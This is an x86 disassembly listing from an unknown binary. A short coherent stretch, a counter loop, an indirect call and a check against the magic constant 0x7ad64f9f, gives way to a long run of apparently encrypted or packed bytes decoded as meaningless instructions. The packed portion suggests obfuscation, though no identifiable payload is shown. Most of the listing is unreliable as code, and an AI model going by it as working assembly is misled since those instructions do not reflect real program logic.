  40285e:	adc    al,0x0
  402860:	add    BYTE PTR [eax],al
  402862:	cmp    DWORD PTR ds:0x42e85e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e85e,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42ead8
  402885:	cmp    DWORD PTR ds:0x42e85e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e85e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e85e,eax
  4028a0:	mov    eax,ds:0x42e85e
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e85e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	rcl    BYTE PTR [edx],1
  4028e2:	shl    DWORD PTR [edx],0xe6
  4028e5:	add    edi,DWORD PTR [esi+0x7e]
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	inc    ebp
  4028ed:	or     al,0x17
  4028ef:	aaa    
  4028f0:	inc    edi
  4028f1:	xchg   ebx,eax
  4028f2:	(bad)  
  4028f3:	mov    esp,0xdb9c50d8
  4028f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028f9:	mov    ecx,0xf57bb846
  4028fe:	mov    ebp,0x286949c9
  402903:	(bad)  
  402904:	sub    al,0xdf
  402906:	fs repz jle 0x4028b7
  40290a:	lea    esp,ds:0x7a05f73f
  402910:	int3   
  402911:	clc    
  402912:	dec    ecx
  402913:	out    0x20,eax
  402915:	retf   0x9175
  402918:	mov    ebp,0xf82991f5
  40291d:	jns    0x4028f4
  40291f:	lock add DWORD PTR [esi],ebx
  402922:	lock cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  402925:	adc    al,0x8b
  402927:	mov    ch,BYTE PTR [ebx]
  402929:	pop    ebx
  40292a:	mov    eax,ds:0x51172ab6
  40292f:	xor    eax,0xe1500652
  402934:	jle    0x402930
  402936:	repnz outs dx,DWORD PTR ds:[esi]
  402938:	cwde   
  402939:	rep lods al,BYTE PTR ds:[esi]
  40293b:	dec    edi
  40293c:	js     0x4028fa
  40293e:	ins    DWORD PTR es:[edi],dx
  40293f:	shr    ch,1
  402941:	mov    BYTE PTR ds:0xd267f07a,ah
  402947:	xchg   edi,eax
  402948:	push   ecx
  402949:	mov    al,BYTE PTR [ebp+0x3f]
  40294c:	dec    edx
  40294d:	mov    eax,0x71967c5d
  402952:	push   eax
  402953:	fld    DWORD PTR [ebx]
  402955:	jnp    0x4028f3
  402957:	jmp    0x4029cd
  402959:	push   es
  40295a:	pop    ebp
  40295b:	mov    esp,0xf1b4f68e
  402960:	aaa    
  402961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402962:	outs   dx,BYTE PTR ds:[esi]
  402963:	cmp    eax,0x53c52472
  402968:	cli    
  402969:	aam    0x86
  40296b:	shl    BYTE PTR [ebx],cl
  40296d:	pop    esi
  40296e:	clc    
  40296f:	into   
  402970:	xchg   BYTE PTR [esi],cl
  402972:	lods   eax,DWORD PTR ds:[esi]
  402973:	bound  ecx,QWORD PTR [eax]
  402975:	push   edx
  402976:	outs   dx,DWORD PTR ds:[esi]
  402977:	push   0xe72a3a97
  40297c:	leave  
  40297d:	dec    eax
  40297e:	inc    edi
  40297f:	out    0x63,eax
  402981:	loope  0x4029c7
  402983:	add    al,0x8b
  402985:	scas   eax,DWORD PTR es:[edi]
  402986:	mov    cl,0x0
  402988:	mov    ah,0x6c
  40298a:	mov    BYTE PTR [ebp-0x5f],ah
  40298d:	call   0xea9e:0x64911760
  402994:	xchg   edx,eax
  402996:	lea    esi,[edi+0x29c41ad4]
  40299c:	stos   BYTE PTR es:[edi],al
  40299d:	ja     0x402964
  40299f:	lods   al,BYTE PTR ds:[esi]
  4029a0:	jno    0x4029b3
  4029a2:	shl    BYTE PTR [ebx+0x46],cl
  4029a5:	cli    
  4029a6:	adc    eax,0xa7022bcc
  4029ab:	in     eax,0xd1
  4029ad:	mov    dl,0xe8
  4029af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029b0:	mov    edi,0x78b8260e
  4029b5:	adc    al,0xf6
  4029b7:	xchg   BYTE PTR [ecx],dh
  4029b9:	(bad)  
  4029ba:	push   ss
  4029bb:	xchg   esp,eax
  4029bc:	in     al,dx
  4029bd:	xor    BYTE PTR [edi+0x48],0x36
  4029c1:	ss data16 jg 0x4029be
  4029c5:	retf   0x84f3
  4029c8:	add    eax,0xe245db3d
  4029cd:	dec    edi
  4029ce:	xchg   ecx,eax
  4029cf:	dec    esp
  4029d0:	pop    edi
  4029d1:	pop    eax
  4029d2:	xor    dh,ch
  4029d4:	xchg   ebx,eax
  4029d5:	jne    0x4029b2
  4029d7:	xchg   ebp,eax
  4029d8:	pop    esi
  4029d9:	in     al,0x78
  4029db:	adc    BYTE PTR [ebx],bl
  4029dd:	push   cs
  4029de:	int    0x3d
  4029e0:	cmp    al,0xd7
  4029e2:	or     eax,0x157b7d50
  4029e7:	mov    WORD PTR [ebx-0x2a510845],es
  4029ed:	mov    bl,0x4f
  4029ef:	imul   eax,DWORD PTR [ecx],0x5c8ce85d
  4029f5:	jle    0x4029f3
  4029f7:	push   ebp
  4029f8:	repnz std 
  4029fa:	aas    
  4029fb:	xchg   edi,eax
  4029fc:	fistp  DWORD PTR [eax]
  4029fe:	xor    al,0xc4
  402a00:	cld    
  402a01:	les    esp,FWORD PTR [edx-0x1f82a16c]
  402a07:	fcmove st,st(7)
  402a09:	mov    bh,0x8f
  402a0b:	jge    0x4029b3
  402a0d:	inc    ecx
  402a0e:	mov    eax,ds:0x1d2d61de
  402a13:	and    DWORD PTR [edx-0xa70a67f],ecx
  402a19:	jg     0x402a1c
  402a1b:	mov    ebx,DWORD PTR [ebx]
  402a1d:	ret    
  402a1e:	ds aas 
  402a20:	adc    eax,0x1dfaa6f8
  402a25:	jmp    0xe0327971
  402a2a:	adc    eax,0xd2ab63b9
  402a2f:	and    eax,DWORD PTR [ebx+0x4f37b81a]
  402a35:	sbb    al,0x6e
  402a37:	std    
  402a38:	adc    ch,BYTE PTR ds:0xa4871243
  402a3e:	repnz and esi,DWORD PTR [ebx]
  402a41:	mov    ebp,0x4e5fc33
  402a46:	pop    ss
  402a47:	adc    edx,DWORD PTR [esi+0x25]
  402a4a:	aas    
  402a4b:	gs jnp 0x402a14
  402a4e:	xor    eax,0x311d8c
  402a53:	fwait
  402a54:	or     DWORD PTR [esi],edx
  402a56:	test   BYTE PTR [esi+0x53],dl
  402a59:	push   eax
  402a5a:	ret    
  402a5b:	push   eax
  402a5c:	(bad)  
  402a5d:	push   esp
  402a5e:	xchg   ebp,eax
  402a5f:	test   BYTE PTR [esi+0x1],cl
  402a62:	sub    ah,dl
  402a64:	and    eax,0xfa36af66
  402a69:	outs   dx,BYTE PTR ds:[esi]
  402a6a:	mov    ds:0x969fd01c,al
  402a6f:	dec    BYTE PTR ds:0x9e118f5d
  402a75:	jg     0x402a3b
  402a77:	popf   
  402a78:	outs   dx,DWORD PTR ds:[esi]
  402a79:	xlat   BYTE PTR ds:[ebx]
  402a7a:	jmp    0xe193:0x1a000cc2
  402a81:	inc    esp
  402a82:	push   ss
  402a83:	or     BYTE PTR [ebx-0x4860bb22],ah
  402a89:	popa   
  402a8a:	jbe    0x402a2c
  402a8c:	pusha  
  402a8d:	popf   
  402a8e:	leave  
  402a8f:	mov    ebp,0x525f4199
  402a94:	adc    al,0x82
  402a96:	pop    ebp
  402a97:	adc    ebp,esi
  402a99:	outs   dx,BYTE PTR ds:[esi]
  402a9a:	mov    bl,0x85
  402a9c:	aas    
  402a9d:	repnz clc 
  402a9f:	mov    bh,0x4d
  402aa1:	cmp    DWORD PTR [ebp+0x1a2dad1c],edx
  402aa7:	mov    dh,0x67
  402aa9:	dec    ecx
  402aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aab:	scas   al,BYTE PTR es:[edi]
  402aac:	cmp    edx,esp
  402aae:	and    BYTE PTR ds:[edi-0x11],0xa
  402ab3:	(bad)  
  402ab4:	pop    ss
  402ab5:	mov    dl,0x88
  402ab7:	adc    al,0xe8
  402ab9:	ins    DWORD PTR es:[edi],dx
  402aba:	xlat   BYTE PTR ds:[ebx]
  402abb:	and    eax,0x59692754
  402ac1:	jb     0x402aa5
  402ac3:	sbb    BYTE PTR [esi+0x2c],bl
  402ac6:	xor    al,0xca
  402ac8:	retf   0x724f
  402acb:	call   0x62da9dc4
  402ad0:	sbb    ebp,edi
  402ad2:	jp     0x402ae6
  402ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ad5:	cmp    al,0x7e
  402ad7:	cmp    dh,BYTE PTR [esi-0x4cdd4a40]
  402add:	mov    al,0xdd
  402adf:	cmp    eax,0x2d59b862
  402ae4:	in     eax,0x3
  402ae6:	sti    
  402ae7:	push   esp
  402ae8:	xor    eax,0xf02b85f0
  402aed:	test   al,0xc8
  402aef:	and    edx,DWORD PTR [edi]
  402af1:	dec    edx
  402af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402af3:	pop    edi
  402af4:	sub    ch,dl
  402af6:	in     al,dx
  402af7:	jae    0x402ae6
  402af9:	push   cs
  402afa:	sub    esi,ecx
  402afc:	sbb    ch,BYTE PTR [esi*1+0x3d0432a7]
  402b03:	shl    BYTE PTR [esi+0x18],cl
  402b06:	lahf   
  402b07:	and    al,0x78
  402b09:	ins    BYTE PTR es:[edi],dx
  402b0a:	or     ecx,esi
  402b0c:	xchg   ecx,eax
  402b0d:	or     BYTE PTR [edx+0x6f],ah
  402b10:	pop    ds
  402b11:	push   esp
  402b12:	idiv   BYTE PTR [ecx+0xc34e887]
  402b18:	jno    0x402ab9
  402b1a:	loope  0x402ad0
  402b1c:	cli    
  402b1d:	cmc    
  402b1e:	mov    esp,0xc72b2530
  402b23:	pop    esp
  402b24:	adc    eax,0x1edec9e8
  402b29:	std    
  402b2a:	(bad)
  402b2f:	in     al,0xea
  402b31:	repnz mov ch,0x35
  402b34:	shl    DWORD PTR [esi-0x69],cl
  402b37:	cwde   
  402b38:	xchg   edi,eax
  402b39:	and    eax,0x7fc9c797
  402b3e:	js     0x402b66
  402b40:	xchg   esp,eax
  402b41:	mov    bh,0xe3
  402b43:	mov    al,ds:0xa4c16218
  402b48:	sub    al,0x8a
  402b4a:	test   BYTE PTR [ebp-0x60],dh
  402b4d:	push   ss
  402b4e:	inc    ebp
  402b4f:	adc    ecx,0xbc697d
  402b55:	aam    0x53
  402b57:	or     DWORD PTR [edx-0x5dd20f2c],ebp
  402b5d:	xchg   ecx,eax
  402b5e:	mov    edx,0x278656b6
  402b63:	pop    edi
  402b64:	sbb    BYTE PTR [esi-0x4ac042ea],ah
  402b6a:	dec    edi
  402b6b:	push   ecx
  402b6c:	stc    
  402b6d:	(bad)  
  402b6e:	jl     0x402bc1
  402b70:	gs mov ebp,0xed94254
  402b76:	inc    edi
  402b77:	pop    ss
  402b78:	push   esp
  402b79:	or     al,0xf2
  402b7b:	popf   
  402b7c:	mov    ebp,0xd5f1242e
  402b81:	(bad)  
  402b82:	lea    ebp,[ebx+0x77]
  402b85:	push   esp
  402b86:	shr    BYTE PTR [ebx+0x28e6bcc4],1
  402b8c:	sub    ebx,edi
  402b8e:	ins    DWORD PTR es:[edi],dx
  402b8f:	pop    ebx
  402b90:	icebp  
  402b91:	cwde   
  402b92:	ja     0x402b74
  402b94:	inc    ecx
  402b95:	pop    eax
  402b96:	lds    ebx,FWORD PTR [esi-0xba4abfa]
  402b9c:	std    
  402b9d:	loop   0x402b87
  402b9f:	xor    eax,0xdca9c277
  402ba4:	adc    BYTE PTR [ebp-0x447022ad],dl
  402baa:	je     0x402bf2
  402bac:	jnp    0x402b85
  402bae:	add    bh,bl
  402bb0:	xor    al,0x7a
  402bb2:	pop    ecx
  402bb3:	inc    ebp
  402bb4:	and    BYTE PTR [ebx+0x5a],0xa1
  402bb8:	ja     0x402bfc
  402bba:	aad    0x43
  402bbc:	in     al,dx
  402bbd:	outs   dx,DWORD PTR ds:[esi]
  402bbe:	loop   0x402bf7
  402bc0:	push   esp
  402bc1:	pushf  
  402bc2:	iret   
  402bc3:	cmp    al,0x45
  402bc5:	sbb    eax,0x2ca623ff
  402bca:	ret    
  402bcb:	or     bl,BYTE PTR ds:0x803ee539
  402bd1:	in     al,0x1
  402bd3:	add    ebp,ebx
  402bd5:	sub    BYTE PTR [ebp-0xa],al
  402bd8:	and    esp,ebx
  402bda:	jbe    0x402bea
  402bdc:	or     ah,bl
  402bde:	pushf  
  402bdf:	mov    dh,0xb3
  402be1:	push   ecx
  402be2:	call   0xae13:0x1f196a9a
  402be9:	outs   dx,DWORD PTR ds:[esi]
  402bea:	mov    DWORD PTR [esi],ebp
  402bec:	(bad)  
  402bee:	cld    
  402bef:	arpl   WORD PTR [esi],bx
  402bf1:	mov    edi,0x23a2d5d4
  402bf6:	lahf   
  402bf7:	mov    al,ds:0xc423cf6e
  402bfc:	out    dx,eax
  402bfd:	addr16 mov esi,?
  402c00:	nop
  402c01:	mov    ebx,0x314eab28
  402c06:	popa   
  402c07:	xchg   edi,eax
  402c08:	xchg   BYTE PTR [esi-0x6f],cl
  402c0b:	jbe    0x402c02
  402c0d:	or     ah,BYTE PTR [edi+0x51edecb5]
  402c13:	pop    ss
  402c14:	jecxz  0x402bb6
  402c16:	xchg   ebx,eax
  402c17:	or     eax,0x6ec2eae2
  402c1c:	and    BYTE PTR [edi+0x5d636868],ch
  402c22:	xchg   ebp,eax
  402c23:	fist   WORD PTR [esi+0x38eb690]
  402c29:	inc    edx
  402c2a:	aam    0xc9
  402c2c:	jae    0x402c93
  402c2e:	xchg   edx,eax
  402c2f:	sahf   
  402c30:	mov    bh,0x87
  402c32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c33:	jno    0x402c97
  402c35:	outs   dx,BYTE PTR ds:[esi]
  402c36:	sub    ebp,DWORD PTR [eax+0x7f985a6d]
  402c3c:	gs jge 0x402bdf
  402c3f:	cli    
  402c40:	xor    ah,cl
  402c42:	adc    eax,0x1f445aa1
  402c47:	sub    dh,al
  402c49:	dec    esi
  402c4a:	sahf   
  402c4b:	dec    ecx
  402c4c:	and    bl,al
  402c4e:	out    0xbd,al
  402c50:	pop    ebp
  402c51:	or     dh,dl
  402c53:	lahf   
  402c54:	and    ecx,esp
  402c56:	mov    al,ds:0xd3d109de
  402c5b:	xor    ah,bh
  402c5d:	mov    cl,0xf
  402c5f:	jae    0x402cc8
  402c61:	fist   WORD PTR [edx]
  402c63:	or     ch,BYTE PTR [eax-0x25284806]
  402c69:	popa   
  402c6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c6b:	nop
  402c6c:	in     eax,dx
  402c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c6e:	and    eax,0xdd990f
  402c73:	xor    BYTE PTR ds:0x78b6f0e9,bh
  402c79:	mov    bl,BYTE PTR [ecx]
  402c7b:	loopne 0x402c07
  402c7d:	std    
  402c7e:	(bad)  [edi-0x7e0fba75]
  402c84:	and    BYTE PTR [ebp-0x16ff8ae4],bl
  402c8a:	retf   0xfffb
  402c8d:	dec    DWORD PTR [ebx+0x558bf445]
  402c93:	call   0xff7deea3
  402c98:	sub    eax,0x840ffabf
  402c9d:	mov    edi,0x8b000003
  402ca2:	inc    ebp
  402ca3:	lock xor DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	sbb    DWORD PTR [esi+edi*4],esi
  402cc3:	xor    al,0xa
  402cc5:	pop    es
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	call   0x9b4d806f
  402cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cd2:	sbb    BYTE PTR [ebp-0x436d7a3a],0xe1
  402cd9:	push   ss
  402cda:	inc    ecx
  402cdb:	rcl    DWORD PTR [edx+0x673106e5],cl
  402ce1:	scas   eax,DWORD PTR es:[edi]
  402ce2:	(bad)  [edi-0x7e]
  402ce5:	sbb    dl,ah
  402ce7:	(bad)  [ecx-0x2a]
  402cea:	neg    dh
  402cec:	xor    ebx,DWORD PTR [edx]
  402cee:	in     al,dx
  402cef:	xor    eax,0x4cd677f6
  402cf4:	push   DWORD PTR [edi+0x39f96888]
  402cfa:	retf   
  402cfb:	jg     0x402d32
  402cfd:	sahf   
  402cfe:	ret    
  402cff:	jae    0x402d33
  402d01:	mov    ah,0xef
  402d03:	in     eax,dx
  402d04:	jno    0x402cf1
  402d06:	out    dx,eax
  402d07:	mov    eax,0xb23a6c79
  402d0c:	inc    edi
  402d0d:	jl     0x402d39
  402d0f:	xor    DWORD PTR [esi],ecx
  402d11:	loop   0x402d8b
  402d13:	ficomp DWORD PTR [ebx+0x18]
  402d16:	add    DWORD PTR [edx+0x38d29a58],ebx
  402d1c:	scas   al,BYTE PTR es:[edi]
  402d1d:	scas   al,BYTE PTR es:[edi]
  402d1e:	push   0x9b7c2d0c
  402d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d24:	pusha  
  402d25:	xchg   esp,eax
  402d26:	aad    0x14
  402d28:	lea    edx,[edi+ebp*8+0x2f5ae1e5]
  402d2f:	cli    
  402d30:	dec    eax
  402d31:	retf   
  402d32:	loope  0x402cbb
  402d34:	int3   
  402d35:	sub    edx,DWORD PTR [edx]
  402d37:	fcmovnu st,st(2)
  402d39:	jecxz  0x402d2b
  402d3b:	ins    DWORD PTR es:[edi],dx
  402d3c:	push   ss
  402d3d:	nop
  402d3e:	push   edx
  402d3f:	arpl   di,di
  402d41:	fdivr  DWORD PTR gs:[ebx+0xa]
  402d45:	stos   DWORD PTR es:[edi],eax
  402d46:	adc    eax,eax
  402d48:	mov    bh,0xd1
  402d4a:	rol    eax,1
  402d4c:	in     eax,dx
  402d4d:	lock dec ecx
  402d4f:	dec    edi
  402d50:	inc    ebp
  402d51:	(bad)  
  402d52:	or     esi,DWORD PTR [ebx]
  402d54:	loope  0x402d43
  402d56:	or     eax,0x5b89ff2
  402d5b:	or     eax,DWORD PTR [ecx+ecx*1-0x1c]
  402d5f:	call   0x44cb:0x641bf048
  402d66:	lahf   
  402d67:	je     0x402d6a
  402d69:	fcomip st,st(4)
  402d6b:	and    dl,BYTE PTR [ecx+0x3f]
  402d6e:	and    bh,BYTE PTR [ebp+0x6c39f34e]
  402d74:	pop    edx
  402d75:	sbb    eax,0x9de3a011
  402d7a:	fistp  WORD PTR [edx]
  402d7c:	jns    0x402dd4
  402d7e:	fdivr  DWORD PTR [eax-0x61]
  402d81:	xor    ecx,ebx
  402d83:	mov    ebp,DWORD PTR [ebx+0x3b]
  402d86:	dec    esi
  402d87:	inc    eax
  402d88:	fbstp  TBYTE PTR [eax+0x5f]
  402d8b:	call   0x5b27:0xf4364d86
  402d92:	dec    ebx
  402d93:	pop    ebp
  402d94:	cmp    esi,ebp
  402d96:	or     BYTE PTR [eax-0x2c],0xa
  402d9a:	dec    ebx
  402d9b:	in     eax,0xa6
  402d9d:	loope  0x402df8
  402d9f:	fiadd  DWORD PTR [esi+0x27]
  402da2:	dec    esi
  402da3:	cli    
  402da4:	shl    BYTE PTR [esp+eiz*4],1
  402da7:	lock inc ebx
  402da9:	push   eax
  402daa:	out    dx,eax
  402dab:	inc    ebp
  402dac:	push   edx
  402dad:	sar    DWORD PTR [esi+0x76],1
  402db0:	sbb    eax,0x98e664e6
  402db5:	mov    esp,0xae32308e
  402dba:	jmp    0x402db1
  402dbc:	and    eax,DWORD PTR [esi]
  402dbe:	xchg   ecx,eax
  402dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dc0:	loop   0x402d5b
  402dc2:	push   esp
  402dc3:	pop    ebx
  402dc4:	lods   al,BYTE PTR ds:[esi]
  402dc5:	cmp    eax,0xab9df837
  402dca:	mov    ?,WORD PTR [ebx+0x30]
  402dcd:	lods   al,BYTE PTR ds:[esi]
  402dce:	adc    al,0x1a
  402dd0:	(bad)  
  402dd1:	out    dx,eax
  402dd2:	fisubr WORD PTR [eax+0x1]
  402dd5:	into   
  402dd6:	push   ds
  402dd7:	xor    dh,ah
  402dd9:	xor    ebp,DWORD PTR [ecx-0x9]
  402ddc:	je     0x402dfa
  402dde:	lea    ebp,[ebp+0xa]
  402de1:	enter  0x8b46,0x7c
  402de5:	popf   
  402de6:	cmc    
  402de7:	mov    edi,0x5812986
  402dec:	or     BYTE PTR [ecx+0x3c],al
  402def:	sbb    BYTE PTR [eax],al
  402df1:	mov    WORD PTR [ebp+0x2e],es
  402df4:	and    BYTE PTR [ebx-0x64],bh
  402df7:	call   0x6701574f
  402dfc:	sbb    DWORD PTR [eax],esi
  402dfe:	pop    es
  402dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e00:	adc    DWORD PTR ds:0x8850bd60,edx
  402e06:	js     0x402e48
  402e08:	mov    ds:0x60e3a4ca,eax
  402e0d:	in     eax,0xcf
  402e0f:	add    BYTE PTR ds:0x5deed6ec,0xe8
  402e16:	add    BYTE PTR [eax+0x30],al
  402e19:	cmp    eax,0x530c4193
  402e1e:	sti    
  402e1f:	dec    eax
  402e20:	xchg   esi,eax
  402e21:	mov    ch,0x7e
  402e23:	mov    ch,0x71
  402e25:	push   0xffffffc2
  402e27:	jmp    0xfadc946b
  402e2c:	inc    esp
  402e2d:	iret   
  402e2e:	sub    ah,BYTE PTR [esi*4-0x387e54fa]
  402e35:	stc    
  402e36:	repnz aas 
  402e38:	cld    
  402e39:	ja     0x402e75
  402e3b:	in     eax,0xbb
  402e3d:	iret   
  402e3e:	call   0x7408dda9
  402e43:	xor    BYTE PTR [ebp+0x5cda6c8c],dl
  402e49:	ja     0x402ea8
  402e4b:	jmp    0xeb94dbc3
  402e50:	sbb    al,0x2e
  402e52:	iret   
  402e53:	iret   
  402e54:	es add eax,0x92c540e
  402e5a:	xchg   esp,eax
  402e5b:	shl    edi,0xd0
  402e5e:	pop    edx
  402e5f:	mov    ch,0x23
  402e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e62:	ds push ebx
  402e64:	xor    eax,0xb2f16f04
  402e69:	xchg   ecx,eax
  402e6a:	or     bh,BYTE PTR [edi]
  402e6c:	fsub   QWORD PTR [eax]
  402e6e:	out    dx,al
  402e6f:	or     edi,edi
  402e71:	sahf   
  402e72:	jno    0x402eb0
  402e74:	dec    ebp
  402e75:	mov    al,ds:0x172b72f
  402e7b:	rol    BYTE PTR [edi+0x1d],1
  402e7e:	add    ch,BYTE PTR [ebx+0x56]
  402e81:	cmp    al,al
  402e83:	pop    esi
  402e84:	mov    al,ds:0xa9314cda
  402e89:	push   eax
  402e8a:	pop    esi
  402e8b:	jae    0x402e60
  402e8d:	icebp  
  402e8e:	sbb    eax,DWORD PTR [ebp-0x7a]
  402e91:	std    
  402e92:	sub    DWORD PTR [edi],eax
  402e94:	and    al,0xf4
  402e96:	dec    ebx
  402e97:	dec    eax
  402e98:	(bad)  
  402e99:	ins    DWORD PTR es:[edi],dx
  402e9a:	pop    ebx
  402e9b:	or     al,cl
  402e9d:	mov    eax,ds:0xcee1c87e
  402ea2:	lea    esi,[eax+ecx*4-0x42]
  402ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ea7:	sbb    ebp,edi
  402ea9:	jne    0x402e81
  402eab:	sbb    bh,al
  402ead:	xlat   BYTE PTR ds:[ebx]
  402eae:	push   0x8545c399
  402eb3:	(bad)  
  402eb4:	pusha  
  402eb5:	add    eax,0x263b13
  402eba:	retf   
  402ebb:	and    eax,0xbc7d2135
  402ec0:	data16 cli 
  402ec2:	inc    eax
  402ec3:	inc    esp
  402ec4:	xchg   ecx,eax
  402ec5:	aaa    
  402ec6:	out    0xa3,eax
  402ec8:	fst    QWORD PTR [ebx]
  402eca:	les    ebx,FWORD PTR [esi-0x2e]
  402ecd:	rcr    al,0x47
  402ed0:	push   eax
  402ed1:	test   eax,0xa85c316a
  402ed6:	enter  0x906e,0xf7
  402eda:	fisub  DWORD PTR [ebx-0x12e117e2]
  402ee0:	add    DWORD PTR [ebx-0x5d],0x99a8ab48
  402ee7:	(bad)  
  402ee8:	adc    BYTE PTR [eax],ch
  402eea:	js     0x402f36
  402eec:	ja     0x402e8d
  402eee:	ja     0x402e84
  402ef0:	les    edx,FWORD PTR [ebx]
  402ef2:	sub    DWORD PTR [ecx],ebx
  402ef4:	jbe    0x402ef7
  402ef6:	mov    bh,0x3c
  402ef8:	shr    BYTE PTR ds:0x57466523,1
  402efe:	mov    ds:0x64b7468a,eax
  402f03:	inc    esi
  402f04:	(bad)  
  402f05:	mul    bh
  402f07:	adc    DWORD PTR [ebx-0x7e],esi
  402f0a:	scas   al,BYTE PTR es:[edi]
  402f0b:	xchg   esp,eax
  402f0c:	and    BYTE PTR [ecx+0x68],ah
  402f0f:	cmp    al,0xa9
  402f11:	and    BYTE PTR [edi-0x635ddf1c],dl
  402f17:	or     esi,DWORD PTR [ebx+0x7]
  402f1a:	paddd  mm7,QWORD PTR [edi]
  402f1d:	push   ecx
  402f1e:	stos   DWORD PTR es:[edi],eax
  402f1f:	cld    
  402f20:	pushf  
  402f21:	out    dx,eax
  402f22:	mov    DWORD PTR [ebp+0x6c4921cb],esp
  402f28:	aaa    
  402f29:	xchg   esi,eax
  402f2a:	cwde   
  402f2b:	and    edi,DWORD PTR [ecx+0x47fc6fb1]
  402f31:	or     al,0xaa
  402f33:	adc    esi,edi
  402f35:	adc    ah,BYTE PTR [edi+eiz*1+0x66e44631]
  402f3c:	pusha  
  402f3d:	pop    ss
  402f3e:	loope  0x402f6e
  402f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f41:	arpl   WORD PTR [eax-0x91fad75],dx
  402f47:	(bad)  
  402f48:	fnop   
  402f4a:	stc    
  402f4b:	das    
  402f4c:	icebp  
  402f4d:	jp     0x402f8a
  402f4f:	call   0xb932:0xde91553e
  402f56:	jmp    0xd440:0x2d708c6d
  402f5d:	outs   dx,BYTE PTR ds:[esi]
  402f5e:	fsub   QWORD PTR [ecx]
  402f60:	retf   
  402f61:	mov    DWORD PTR [eax+0x4d],esp
  402f64:	cdq    
  402f65:	fwait
  402f66:	into   
  402f67:	jno    0x402eeb
  402f69:	jmp    0x402efa
  402f6b:	xor    ecx,DWORD PTR es:[esi-0x46]
  402f6f:	cmp    BYTE PTR [edx+0x12],bh
  402f72:	mov    esp,0x1c8148f7
  402f77:	adc    eax,0xf18b61af
  402f7c:	xchg   esi,eax
  402f7d:	je     0x402fc6
  402f7f:	cmp    esi,DWORD PTR [eax+0x4cfd67b9]
  402f85:	push   ss
  402f86:	lods   al,BYTE PTR ds:[esi]
  402f87:	dec    edi
  402f88:	mov    bl,dl
  402f8a:	push   ds
  402f8b:	xor    al,BYTE PTR [ebx+0x36]
  402f8e:	sub    al,0xa2
  402f90:	mov    ecx,0x68a5a3b
  402f95:	mov    BYTE PTR [ecx],ch
  402f97:	adc    bl,BYTE PTR ds:0x38d6dcb6
  402f9d:	ja     0x402fb3
  402f9f:	in     al,dx
  402fa0:	repz fld DWORD PTR [ecx-0x66]
  402fa4:	inc    ebp
  402fa5:	(bad)  
  402fa6:	adc    cl,dh
  402fa8:	sub    ecx,ebx
  402faa:	inc    eax
  402fab:	arpl   WORD PTR [edi+esi*8+0x3c],bx
  402faf:	ins    BYTE PTR es:[edi],dx
  402fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fb1:	dec    ebp
  402fb2:	int3   
  402fb3:	sub    ecx,DWORD PTR [ebx+0x61]
  402fb6:	adc    BYTE PTR [ecx],bl
  402fb8:	pop    esi
  402fb9:	mov    ds:0xa6f2619f,al
  402fbe:	out    dx,al
  402fbf:	mov    esp,ecx
  402fc1:	or     eax,0x64082d27
  402fc6:	mov    esp,0x7bb0dbd2
  402fcb:	push   edx
  402fcc:	push   ds
  402fcd:	lahf   
  402fce:	inc    esp
  402fcf:	retf   0xa3f8
  402fd2:	sti    
  402fd3:	push   ds
  402fd4:	and    BYTE PTR [edx-0x72],ch
  402fd7:	adc    BYTE PTR [ebp-0x68],ch
  402fda:	shr    DWORD PTR [esi],cl
  402fdc:	or     eax,0x758cd729
  402fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fe2:	ds call 0xbbb667cd
  402fe8:	jns    0x40304d
  402fea:	mov    bh,0x5c
  402fec:	xor    ecx,ecx
  402fee:	pushf  
  402fef:	dec    ebx
  402ff0:	test   DWORD PTR es:[ecx+0x209f2fe0],edi
